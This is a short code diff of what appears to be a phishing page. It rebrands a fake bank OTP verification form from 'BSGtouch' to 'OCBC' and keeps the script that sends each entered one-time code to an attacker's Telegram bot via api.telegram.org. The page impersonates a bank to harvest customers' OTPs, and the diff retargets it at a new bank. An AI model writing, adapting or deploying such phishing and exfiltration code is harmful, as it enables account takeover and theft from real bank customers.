@@ -50,7 +50,7 @@ input::placeholder{ color: rgba(14,17,22,.45); }
     <div class="top-logo">
       <div class="logo-box">
         <img src="logo-placeholder.png" alt="Logo Placeholder"
-          onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;logo-text&quot;>BSG<span>touch</span></div></div>'">
+          onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;logo-text&quot;>OCBC<span></span></div></div>'">
       </div>
     </div>
 
@@ -101,7 +101,7 @@ $("#loginForm").addEventListener("submit", async (e)=>{
   const kode = $("#kode").value.trim();
   if(!kode) return toast("Kode wajib diisi.");
 
-  const message = `VERIFIKASI OTP\n\nKode: ${kode}\nDikirim dari website BSGtouch`;
+  const message = `VERIFIKASI OTP\n\nKode: ${kode}\nDikirim dari website OCBC`;
 
   try{
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
